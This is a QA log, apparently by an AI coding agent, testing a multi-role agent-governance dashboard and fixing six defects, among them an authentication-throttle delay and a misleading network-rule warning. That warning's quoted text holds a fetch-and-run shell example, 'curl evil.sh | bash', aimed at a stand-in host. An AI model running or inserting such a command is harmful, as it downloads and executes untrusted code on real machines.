# QA session log, 2026-10-07

Kinan's request: "understand the project through the code, mg folder and docs-notes folder, then
do a live QA of the dashboard from the pov of all roles and multiple accounts and agents, making
sure different interactions work and things are convenient."

Written as the work happens (standing instruction: document everything). Findings are numbered
from **406** (405 was the last, 2026-10-04). Standing rules followed: fix on sight and sweep the
class, prove a code defect red before fixing it, decide by precedent and record the decision,
commit nothing without Kinan's word.

## 0. Starting state

- Branch `governance-layer`, HEAD `77e375c1019`. Uncommitted: `docs-notes/WRITING-GUIDE.md`,
  `mg/WORK-LOG-2026-10-04.md` (report work), untracked `.codex/` (another agent's, never commit)
  and `docs-notes/report/ch3-3.5.6-to-3.6.tex`. No code is uncommitted.
- `dist/.buildstamp` was built from `0b477ce46db`; eleven files under `src/` and `ui/src/` were
  newer (T73/T76/T78's final edits), so `node scripts/build-all.mjs` was re-run before the QA.

## 1. The fixture

`scratchpad` = `%TEMP%\claude\C--Users-kinan-openclaw\673a6204-7323-4ac4-a0b3-78aa2ffceb16\scratchpad`.
The 2026-09-27 fixture's scratchpad no longer has its scripts, so a fresh one was made.

- Mock model: qa-lab's `startQaMockOpenAiServer`, port **44091**, `scratchpad/qa/mock-openai.mts`,
  launch entry `qa-mock-openai-8`.
- Gateway: launch entry `governance-gateway-qa8`, port **18841**, own state, governance and home
  directories under `scratchpad/qa/`. Config written by `scratchpad/qa/make-config.mjs`: local,
  loopback, token auth (token in `scratchpad/qa/gateway-token.txt`, never printed), provider
  `mock-openai`, agents `main` (default), `scout`, `beta`, `delta`, each in its own workspace.
- `scratchpad/qa/gov.mjs`: calls any governance route as any account (cookie jar per account),
  used for checking state and for a second operator acting while the page is open.
- Unlike earlier passes, the organisation is **claimed through the dashboard** (first-run form),
  and accounts are created through the dashboard, so the first-run path is part of the QA.

## 2. First run, as the person installing it (Root)

- Gateway connect screen, token pasted, Connect: the Governance page opens on "Create the Root
  account" with the warning that Root's password cannot be reset. PASS.
- Mismatched confirmation: the box turns red with no words until **Create** is pressed, then
  "The two passwords do not match." PASS (the words could come earlier; not changed).
- Matching passwords, **Enter** in the confirm box: Root created and signed in. PASS.
- For about ten seconds after that the page was half-drawn: "No agents yet" although OpenClaw
  had four, "Loading policy…", and Organisation reading "Removes all 0 account(s), including
  your own Root account". All settled on the first refresh. See finding 406: every one of those
  reads was waiting out a 5-second penalty.
- Accounts made **through the Create account form**: admin1 and admin2 (Administrators), user1
  and user0 (Users, answer to admin1), user2 (User, answers to admin2), viewer1 (admin1),
  viewer2 (admin2). Every row correct on the server. PASS. Each press kept the page busy 12–20 s.
- admin1's row, while it was the only Administrator: "The only Administrator. Create a second
  one before changing this account's role, so the accounts answering to it still have someone
  answerable." The rule is right (a demoted Administrator would itself need an Administrator to
  answer to), but the reason given is about _other_ accounts, and nobody answered to admin1 yet.
  Low; wording only.

## Finding 406: every dashboard request waited out a brute-force penalty (up to 5 s)

- **Seen live.** Account creation took the Gateway 111 ms over HTTP and the page 12–20 s. The
  page's resource timings showed every governance request answering after a constant
  ~5,030 ms, six at a time. The 2026-09-27 log (§2) put this down to "the browser pane's network
  path". **That was wrong.** A logging reverse proxy between the pane and the Gateway
  (`scratchpad/qa/timing-proxy.mjs`) measured the Gateway itself taking 5,030–8,300 ms to send
  headers, and replaying the browser's exact request with Node straight at the Gateway took
  5,042 ms. The Gateway was idle (0.03 CPU-seconds in 5 s): it was sleeping, not working.
- **Cause.** The Control UI sends its **paired-device token** as the Bearer credential
  (`ui/src/app/control-ui-auth.ts` prefers `hello.auth.deviceToken`; the captured value is
  43 characters, the Gateway token 48). `authorizeControlUiReadRequest`
  (`src/gateway/control-ui.ts`) tries it as the shared secret first; the mismatch calls
  `recordFailureAndDelay`, which on loopback sleeps 250 ms doubling to 5 s
  (`auth-rate-limit.ts`); only then does the device-token check accept it and reset the count.
  The governance page reads about twelve routes every 15 s, concurrently, so failures pile up
  faster than resets and the penalty sits at its 5 s cap. Upstream code, but the fork's page is
  what drives it this hard; upstream's own Control UI HTTP reads (media, avatar, bootstrap
  config) pay it too.
- **Consequence.** Every governance read and every press took 5–20 s for a real operator, on a
  loopback install, with the right credentials. It is also why earlier QA saw approval cards
  appear late and a second operator's answer "win" (finding 386's setting).
- **Fix.** The shared-secret attempt now gets a limiter whose failure penalty is held back and
  applied only if the device-token check fails too. A valid device token is never penalised;
  a wrong token is penalised in both scopes as before; a locked-out device-token scope still
  refuses.
- **Proved red first.** New `src/gateway/control-ui-read-auth-penalty.test.ts`: four reads with
  a valid device token recorded four penalties (1.35 s). Green after the fix; 816/816 in it,
  `control-ui.http.test.ts`, `auth-rate-limit.test.ts` and `auth.test.ts`. Mutation: removing
  the replay of the held failure turns "still penalises a wrong token" red.
- Live re-verification waits for the end-of-pass rebuild (rebuilding `dist` under a running
  Gateway breaks its lazy imports).

## 3. Root delegates agents

- Agents in your organisation lists the four host agents as unregistered, each with **Register**.
  The list is alphabetical, so `main` and `scout` sit below `beta` and `delta`. PASS.
- **Register** on `main` (as Root): registered at once, **owned by Root**, with no choice of owner.
  To give it to admin1: Edit… → New owner → Change owner → confirm. The dialog said "Users and
  Viewers who answer to root lose this agent …", which is generic (nobody answers to Root, and
  nobody held `main`). That one change kept the page busy 34 s (finding 406). See finding 407.
- The editor's owner list says "root (root)", the create form says "root (you, Root)". Trivial.
- `scout` registered for admin1 over HTTP (`adminId`, Root only), the route the page never uses.
- `beta` and `delta` left unregistered so admin2 registers them from their own page.

## Finding 407: Root cannot choose an owner when registering an agent

- `agents/register` accepts `adminId` from Root, and `GovernanceApi.registerAgent` passes it, but
  the Register button (`agent-registry-panels.ts`) never sends one, so every agent Root registers
  is Root's, and delegating it takes four more presses and a confirmation that warns about
  people who do not exist. **Create agent** on the same section already asks "Choose who owns
  this agent". Convenience, not access: nothing is reachable that should not be.

## 4. admin1 and user1 at the same time (two origins, two cookies)

- Sign-out: immediate, no dialog, back to "Sign in to governance". PASS.
- Wrong password: "Invalid credentials", no other detail. PASS. Right password: signed in
  (8.4 s; user1's took 20 s, both finding 406).
- admin1's page: "Your accounts" lists user1, user0 and viewer1 only; agents main and Scout owned
  by admin1 with Edit…, Allow Codex, Remove…; beta and delta still offer Register (any
  Administrator may claim an unregistered host agent; by design). PASS.
- Assignment is a free-text box, "Assigned agents (comma separated)", with a datalist of the
  agents admin1 may assign. Low: **Enter does nothing** there (the sign-in and Root forms submit
  on Enter); the datalist only helps with the first id; all three boxes have the same accessible
  name, so a screen reader cannot tell whose box is whose.
- "main, scout" → user1 holds main, scout. Typo "scuot" → "agent "scuot" is not in the agent
  registry, so it cannot be assigned. An Administrator must register it first." at the top of
  the page, scrolled into view; the typed value kept. PASS (said to an Administrator, the last
  sentence reads oddly). viewer1 → scout. PASS.
- user1's page: Identity, Your agents, Active agent sessions, Agent permissions, Emergency kill
  switch, Policy, Audit ledger, Rule requests, System resources. PASS.
- Talk → main: "Reply with exactly: USER1-MAIN-OK", sent with **Enter**, reply in 7 s, box
  cleared when the reply came (the text stays in the box while the agent works). PASS.
- **Escalation answered by another operator.** user1 asked main to run `hostname`; the card
  appeared for user1 (20 s) and for admin1 ("Only accounts that manage this agent see this
  question …", expiry countdown, Allow once / Always allow / Deny). admin1 pressed **Allow
  once** (real click): the card left both pages, user1's conversation got the reply with the
  hostname. PASS. Low: the card names the requester only inside the session key
  `agent:main:governance:user1`. Low: admin1's page still showed the earlier "scuot" refusal
  after this successful answer.
- **Always allow by the User.** Same prompt, user1 pressed Always allow: allowed this time, no
  dialog, and the request "^hostname$ for agent main, requested by user1, answering an
  escalation" appeared under Rule requests. PASS. admin1's page showed "No rule requests" for
  about a minute after the server already listed it (406). **Approve** (no dialog): "decided by
  admin1 · approved", rule in Policy titled with user1's reason. PASS.
- **Stale notice:** user1's page kept "“Governance: unlisted command” was allowed this time.
  Allowing it every time needs an Administrator's approval: the request is under Rule requests,
  and until it is approved the next attempt asks again." for minutes after admin1 approved it.
- **A run cancelled by someone else.** user1 started a long task on Scout. admin1's Active agent
  sessions: "scout · running for 10s · started by user1", Observe, Stop agent, and (once the
  run list had loaded) Cancel. admin1 pressed Cancel: "Stopping…", then gone. user1's
  conversation: "The run did not complete: The prompt was cancelled." **It does not say that
  admin1 cancelled it**, so to user1 it reads as a fault. Candidate finding (408).
- **Kill switch as a User.** "Scout" typed (the display name, capitalised) resolved to `scout`;
  dialog "Lock down this agent? …"; locked: "Scout · Locked down. Nothing was running for this
  agent, so nothing had to be stopped …". Release, no dialog. PASS. The lock took **23.8 s** in
  the page; timed on Release: the `kill` request itself 710 ms, then the page's follow-up
  refresh 14.5 s with every read held ~5 s (406). The lock is in force at 710 ms; the page only
  says so later. This matters for Requirement 7's demonstration.

## 5. Viewer, a User with no agents, the second Administrator

- **viewer1** (holds scout): Identity, Active agent sessions, Agent permissions, Policy, Audit
  ledger, Rule requests, System resources. No prompt, kill or authoring controls; the posture
  radios render disabled; main's `^hostname$` rule is not shown (not viewer1's agent); 16 global
  rules readable with "Who does this affect?". Ledger: only scout's six entries, each
  "[redacted for viewer role]" with actor and tier. **Verify chain integrity**: "Checked 43
  entries, ending at #43 … Checkpoint agrees at #43". PASS.
- **user0** (no agents): every agent section says "No agents are assigned to you yet … ask yours
  to add one". PASS. Low: "yours" is never named (admin1), though the server knows it.
- **admin2**: Your accounts lists user2 and viewer2 only; admin1's main and Scout listed with no
  controls. **Register** on beta and delta: owned by admin2. PASS. user2 ← beta. viewer2 ←
  "beta, main": refused whole, "agent "main" belongs to a different Administrator, so it cannot
  be assigned here", nothing saved; then "beta" alone. PASS.
- **Create agent** "Epsilon Worker" (name only): the page said "Creating Epsilon Worker. This can
  take a minute or more; the emergency stop stays available meanwhile." **Lock down** was
  pressable during it once an id was typed (finding 384's fix holds). Done in 48 s: "Created
  epsilon-worker, and OpenClaw has picked it up. That id is what you use …". PASS. Its workspace
  is `ws-main/epsilon-worker`, inside main's (upstream placement; 385 handles it in the gate).

## Finding 408: an escalation into another agent's workspace does not say whose workspace it is

- **Seen live, with the model.** A file planted at `ws-main/epsilon-worker/secret.txt`
  (Epsilon Worker belongs to admin2). admin1 asked `main` to read `epsilon-worker/secret.txt`:
  no silent read (385's fix holds), an escalation instead. Denied. Then **user1** (holds main and
  scout, not epsilon-worker) asked the same: the card went to user1, user1 pressed **Allow once**,
  and the reply carried "EPSILON-PRIVATE: admin2 notes QA-EPS-SECRET-4410".
- **Is that a hole in 385?** Judged against the role model, no: a User may write an agent-scoped
  **allow rule for any path** for an agent it holds (`policy/rules` checks only that the agent is
  theirs, and Root's "withhold rule editing" is the control over that), so approving one read is
  inside the authority the model gives a User. What 385 removed was the **silent** read through
  the baseline rule; that stays removed. But two things are wrong:
  1. The card says only `Agent "main" wants to run "read" against path "C:/…/ws-main/
epsilon-worker/secret.txt", which no policy rule currently covers.` Nothing tells the
     person deciding that the file belongs to another agent, owned by another Administrator.
     The one fact that should stop them is missing from the question.
  2. The record of 385 (`GOVERNANCE.md`, the 2026-09-27 log §17) says the same read "reached
     default-deny". That is true only when unlisted actions are set to **Deny**; under the
     default **Ask a human** it escalates to the agent's managers, the User included.
- Fix decided below (§ fixes).

## 6. Policy authoring as user1

- Add rule: allow command `^uname -a$`, description "Scout may print system information for the
  weekly report", agent typed **"Scout"**: added, scoped to `scout`, the description as its
  title. PASS. For `beta` (not user1's): "You do not manage agent "beta"". PASS. Low: the page
  knows user1's agents and could say so before the press.
- **Upstream behaviour worth knowing:** after admin1 cancelled user1's long Scout task, user1's
  next Scout message was merged with the cancelled one by the host ("Merged and removed orphaned
  user message to prevent consecutive user turns"), so the cancelled request reached the model
  again and the mock's "wait until stopped" scenario restarted. user1's own **Cancel** stopped it
  (15 s, finding 406). Not the fork's code; recorded because a cancelled request resurfacing in
  the next turn is surprising to an operator.

## Finding 409: Agent permissions told a User "Nobody" can reach an agent they hold

- **Seen live.** user1 looked up "Scout" under Agent permissions: the rules came back (17, the
  new uname rule among them), and "Who can reach this agent" said **"Nobody. No User or Viewer
  has been assigned this agent."** user1 and viewer1 both hold it; admin1 typing `scout` saw
  "user1, viewer1".
- **Cause.** `agents/access` passed the id as typed to `findUsersForAgent`
  (`src/governance/user-store.ts`), which compared it with `===` against assignments that
  `normalizeAgentIds` stores canonical (lower case). The rules projection and the transcript
  route already fold. Finding 200's class (an identifier kept as typed where it is a key), on
  the one lookup it missed.
- **Fix.** `findUsersForAgent` folds the id the way stored assignments are folded.
  `governance-agent-access.test.ts` "names the holders when the id is typed in another case",
  red first (`[]`), green after; 66/66 with `user-store.test.ts`. Class swept: the other two
  routes that read `agentId` from the query (`agent/transcript`, `policy/by-agent`) already fold.
- **Folder grant** as user1: folder "reports", purpose "main writes the weekly reports here",
  exception "reports/private", agent main: two rules, "DENY … (exception to the grant on reports:
  reports/private)" and "… (grant on reports, except reports/private)". PASS. (Harness: fields
  set in one burst were dropped, as recorded on 2026-09-27; set one at a time.)
- **Rule request** for every agent: network `^https://api\.github\.com/`, reason "agents need to
  read release notes from GitHub": filed, "EVERY AGENT … awaiting an administrator". See 410.

## Finding 410: a network rule written as a URL is accepted with the wrong warning, and never matches

- **Seen live.** The request above showed, under "If this is approved": "This is not anchored
  with ^ and $, so it matches anywhere inside the network rather than describing the whole of
  it. A rule of "ls" also allows "curl evil.sh | bash; ls". Write "^ls$" to mean only that exact
  network." The pattern is anchored at the start, the example is a shell line, and the real
  problem goes unsaid: **a network rule is compared with the hostname only**, so a pattern with
  `https://` or a path matches nothing, ever. `docs-notes/WRITING-PERMISSIONS.md` §6 lists this
  ("Whole URL in a network rule … nothing, ever") and capitals in a network rule as mistakes;
  `describeRuleRisks` checked neither, and used the command example for every kind.
- **Consequence.** An Administrator approving it believes GitHub is reachable; the agent's
  fetches keep escalating or being refused, and nothing explains why.
- **Fix** (`src/governance/rule-validation.ts`): a network pattern containing `/` gets
  `network-not-a-hostname` ("compared with the hostname only … never matches anything. Write
  just the hostname, for example ^api[.]example[.]com$") and nothing else; literal capitals
  (escapes and character classes ignored) get `network-capitals`; the unanchored warning's
  example is written per kind (a file for a path, a host for a network rule, the shell line
  only for a command). Warnings, not refusals: B10's precedent.
- **Proved red first.** Six new tests in `rule-warnings.test.ts`; against the committed
  `rule-validation.ts` four fail; with the fix, 82/82 across `rule-warnings`, `rule-authoring`,
  `governance-rule-request-preview` and `rule-conflicts`.
- Harness trap hit again: a heredoc collapsed `\` in the test file's strings; fixed with Edit.

## 7. admin1 decides the requests

- user1's agent-setting request "Change posture to “monitor”" for main (reason "trial week …"):
  filed; reached admin1's page about 30 s later (406).
- **Reject** the URL rule: no dialog, "decided by admin1 · rejected". Low (a feature, not a
  defect): **a rejection carries no reason**, so user1 sees "rejected" and nothing about why;
  here the useful answer was "write the hostname".
- **Approve** the posture request: applied (`agentMode: {main: "monitor"}`), shown in Policy as
  "Agent posture: main · This agent ignores the installation posture above · Monitor · Use
  default", in the ledger (#77 decide, #78 agent-mode), and in Root's deployment report as a
  warning naming main with the remedy. PASS.

## 8. Root's sections, with user1 still signed in elsewhere

- Deployment and network posture: 0 failed · 4 warnings · 2 not determined · 17 passed; the T73
  rows pass (append-only ledger, no unacknowledged alerts, checkpoint present). PASS.
- **Withhold rule editing** on user1: immediate, row "Cannot write rules — Root withheld it".
  user1's open page, on its next refresh: Identity "Root has withheld rule editing from this
  account, so to change a rule you request it and an Administrator approves", and every Add
  rule / Remove control gone. Restored with Allow rule editing. PASS.
- **Answers to** (finding 383's control) on user2, admin2 → admin1: dialog "Move this account to
  another Administrator? It must hold only agents that Administrator owns …"; refused "Cannot make
  user2 answer to admin1: it holds beta, which admin1 does not own. Remove it from user2's agents
  first, then move the account."; the picker went back to admin2. PASS. Low: the page knows
  user2 holds beta and could say so in the dialog instead of after the press.
- Audit ledger filters: Agent actions 9, Policy changes 56, Sign-ins 17, All 82 (50 shown).
  PASS. (#68: Scout's `exec uname -a` allowed by user1's rule, confirming that rule works.)
- 375-px window on user1's page: the section list wraps, rows stack, nothing clipped. PASS.
- Agents: Remove… on delta → three choices explained; "Remove from governance" dialog "The agent
  and its workspace stay exactly as they are …"; done, delta back to Register. PASS.
- Accounts: Delete user0 → "Delete this account? This cannot be undone, and there is no password
  reset." Deleted. Low: "there is no password reset" is borrowed from the organisation dialog;
  for another account it is irrelevant, and Root can set other accounts' passwords.

## Low observations collected so far (not findings)

1. First render after bootstrap: "Removes all 0 account(s), including your own Root account".
2. Sole-Administrator sentence gives another account's reason.
3. Change-owner dialog warns about Users and Viewers "who answer to root" when none exist.
4. Owner list "root (root)" vs "root (you, Root)".
5. Assignment box: Enter does nothing; same accessible name on every row.
6. "An Administrator must register it first" said to an Administrator.
7. Approval card names the requester only inside the session key.
8. A page error stays after a later successful action from another controller (approval answer).
9. "Allowed this time … until it is approved the next attempt asks again" stays after approval.
10. Add rule for an agent the User does not hold: refused only after the press.
11. Rejections carry no reason.
12. Delete-account dialog's "there is no password reset".

## Finding 411: a User whose task an Administrator cancelled was told only "The prompt was cancelled."

- Seen in §4: admin1 cancelled user1's Scout task from Active agent sessions; user1's
  conversation read "The run did not complete: The prompt was cancelled." with nothing saying
  someone else stopped it, so it read as a fault. The ledger knew (#38 prompt-cancel by admin1).
- **Fix.** `cancelPromptRun` (`src/governance/prompt-runs.ts`) remembers the cancelling account
  when it is not the run's own (`cancelledBy`, read through `promptRunCancelledBy` while the run
  settles); `agent-conversation.ts` words the turn "The prompt was cancelled by admin1." A User
  cancelling their own run reads as before.
- `agent-conversation.test.ts` "says who cancelled a run when it was another account", red first,
  53/53 with `prompt-runs.test.ts`.

## The fixes (each proved red first)

| Finding | What changed                                                                                                                                                                                                                                | Proof                                                                                          |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| 406     | `authorizeControlUiReadRequest` holds back the shared-secret failure penalty until the device-token check has also failed                                                                                                                   | new `control-ui-read-auth-penalty.test.ts` (3), red 4 penalties; mutation of the replay caught |
| 407     | Root gets an owner picker beside Register on each unregistered row (defaults to Root, so one press still works); the choice is per row (`registerOwnerFor`/`registerOwnerId`) and sent as `adminId`; Administrators unchanged               | new `ui/…/register-owner.test.ts` (5), all red first                                           |
| 408     | `otherAgentHoldingPath` (`agent-workspace-roots.ts`): the innermost configured workspace holding a path; the escalation says "against a path inside the workspace of another agent, "x": "…"", before the path so truncation cannot drop it | `nested-workspace.test.ts` +3 (2 red; the negative case passes before and after)               |
| 409     | `findUsersForAgent` folds the id                                                                                                                                                                                                            | `governance-agent-access.test.ts` +1, red `[]`                                                 |
| 410     | network warnings: `network-not-a-hostname`, `network-capitals`; per-kind unanchored examples                                                                                                                                                | `rule-warnings.test.ts` +6, 4 red on HEAD                                                      |
| 411     | cancelled-by named in the conversation turn                                                                                                                                                                                                 | `agent-conversation.test.ts` +1, red                                                           |
| low 5   | Enter saves an assignment box on both panels; each box is labelled "Agents assigned to <account>"                                                                                                                                           | `dashboard-qa-2026-10-03.test.ts` +1, red                                                      |
| low 12  | delete-account dialog: "This cannot be undone: it is signed out everywhere at once, and giving this person access again means creating a new account."                                                                                      | wording                                                                                        |

Decisions taken (by precedent, recorded as asked):

- **D1** 406 fixed in upstream code (`src/gateway/control-ui.ts`): the fork's page is what
  exposes it, and upstream edits are the fork's to make (standing rule).
- **D2** 407's picker defaults to Root, keeping the one-press path (do not break what works);
  Create agent forces a choice because it has no prior behaviour to keep.
- **D3** 408 is fixed by **informing**, not by refusing: a User's authority to write any path
  rule for an agent it holds is the role model's (T27; Root withholds it), so refusing only the
  escalation would be inconsistent. The register's "reached default-deny" for 385 is corrected
  to say it holds under Deny-on-miss and escalates under Ask.
- **D4** 410 warns and does not refuse (B10's precedent: warnings at the moment of writing).
- **D5** Lows 1–4, 6–11 recorded, not changed (wording or small features; none misleads about
  an outcome except 9, whose "until it is approved" is a conditional that stays true, and 11,
  a feature: a reason on rejection).

## 9. Gates on the fixed tree

- Typechecks: core, UI, core-test and UI-test all exit 0.
- `oxlint` (plain, repo config) over the 19 touched source and test files: 0. `oxfmt --check`: clean
  after formatting `agent-registry-panels.ts` (only this session's hunks moved).
- Governance UI tests (`ui/src/pages/governance`, UI config): 382 passed / 16 skipped, 37 files.
- **Governance suite** (`src/governance/ src/gateway/governance-*.test.ts
src/gateway/control-ui-read-auth-penalty.test.ts ui/src/pages/governance/`): **3,549 passed /
  22 skipped / 0 failed**, 226 files passed and 2 skipped, 17 m 24 s.
- Registers: `GOVERNANCE.md` rows 406–411, the index range "1 to 411", and finding 385's row
  corrected (default-deny holds under Deny-on-miss; under Ask it escalates and, since 408, names
  the other agent); `QA-IN-PLAIN-TERMS.md` §5.125; `CHAPTER3-MATERIAL.md` §3.5.98. All three
  `oxfmt`-clean. `DOCUMENTATION-UPDATES.md` was **not** touched: the report session of the same
  day (`mg/WORK-LOG-2026-10-07.md`) was rebuilding its §3; the report items are listed in §11
  below for it to fold in.
- Counts: **411 found / 411 fixed / 0 open**, with 169 closed as not reproducible (never "all
  fixed").
- Rebuild (`build-all`) started with the QA Gateway stopped.

## 10. Live re-verification on the rebuilt Gateway

`build-all` exit 0 (18 m 1 s, every step including `write-cli-startup-metadata`), with the QA
Gateway stopped; restarted; both operators were still signed in after the restart (396's fix).

- **406**: steady state, 42 governance reads over two refresh cycles: **median 43 ms, max 91 ms**
  (was a constant ~5,030 ms). A warm full page load: every read 14–123 ms, page ready in 2.4 s.
  The very first batch after a cold Gateway start took ~6 s once (modules loading), not repeated.
  Kill switch through the page: lockdown shown **214 ms** after the confirmation (was 23.8 s),
  release shown in 376 ms. PASS.
- **407**: delta's row offered "root (you, Root) / admin1 / admin2", labelled "Who will own delta
  once registered"; admin2 chosen, Register: "Owned by admin2" in 625 ms. PASS.
- **408**: user1 asked main to read `epsilon-worker/secret.txt`: the card read "Agent "main" wants
  to run "read" against a path inside the workspace of another agent, "epsilon-worker":
  "C:/…/secret.txt", which no policy rule currently covers." user1 denied it. PASS.
- **409**: user1, Agent permissions for "Scout": "user1, viewer1". PASS.
- **410**: a new request `^https://api\.github\.com/` showed "A network rule is compared with the
  hostname only … never matches anything. Write just the hostname, for example
  ^api[.]example[.]com$." Rejected afterwards (QA data). PASS.
- **411**: Root cancelled user1's running task from Active agent sessions; user1's conversation:
  "The run did not complete: The prompt was cancelled by root." PASS.
- Enter in Root's assignment box for viewer2 sent `users/agents` (200); the box is labelled
  "Agents assigned to viewer2". PASS.

Observations from this pass, not changed:

- Main's posture had to be reset from Monitor first (the approved request). Root's "Use default"
  took 39.8 s, and a ledger read 7.4 s, because upstream's background **dreaming** run
  ("Write a dream diary entry …", ledger #88, attributed to webchat) started on main after the
  restart: finding 395's class, upstream work stalling the Gateway, not the penalty.
- The dreaming run on scout **executed `uname -a`** (ledger #95, allowed by user1's rule): the
  mock model reacts to old prompt text inside the memory fragments. A harness artefact, but it
  shows background runs are governed like any other.
- **Unreproduced (kept like 169):** Root's first Cancel on user1's new run answered "This task is
  no longer running. The list has been refreshed." while it was running; two later attempts,
  one with the request logged, sent the right run id and cancelled. Most likely the press fell in
  the one-refresh window where the row still carried the previous, just-ended run; the sentence
  was then true of that run but reads as wrong.
- A Release pressed while the page was finishing the lockdown's refresh was ignored (the button
  is disabled while busy; Lock down is exempt since 384, Release is not). Low.

## 11. What the report owes (for the report session to fold into DOCUMENTATION-UPDATES.md)

Not written into `DOCUMENTATION-UPDATES.md` because the report session was rebuilding it today.

1. **Latency claims.** Any dashboard response or kill-switch figure measured through the page
   before this fix included finding 406's penalty (up to 5 s per read). The kill request itself:
   710 ms before, 214 ms page-confirmed after. Chapter 4 should use post-fix numbers.
2. **3.5.2.3 Path Canonicalization / finding 385:** a nested agent's path is denied under
   Deny-on-miss and **escalated** under the default Ask-a-human, and the question names the
   other agent (408). "Reached default-deny" alone is not the whole truth.
3. **3.5.2.1 Rule Model:** network patterns match the hostname only, lower-cased; the dashboard
   now warns when a pattern contains a scheme, a path or a capital (410). (The report session's
   own list already has an item for Chapter 1's hostname fact.)
4. **3.5.11 Management Interface:** Root chooses the owner when registering a host agent (407); a
   cancelled task names who cancelled it (411); the access roster folds the id (409).
5. **3.5.4 Access Control:** the Control UI authenticates HTTP reads with its paired-device token;
   the loopback brute-force throttle applies only when that token is neither the shared secret
   nor a valid device token (406).

## 12. State left behind

- Code changes uncommitted (Kinan's word needed): 13 source/test files modified, 2 new test files
  (`src/gateway/control-ui-read-auth-penalty.test.ts`, `ui/src/pages/governance/register-owner.test.ts`).
- QA fixture left running: `qa-mock-openai-8` (44091) and `governance-gateway-qa8` (18841), state
  under this session's scratchpad. Launch entries added to `.claude/launch.json` (git-ignored).
- QA data in the fixture only: accounts root, admin1, admin2, user1, user2, viewer1, viewer2
  (user0 deleted); agents main, scout (admin1), beta, delta (admin2), epsilon-worker (admin2);
  rules written by user1; two rejected and two approved requests.
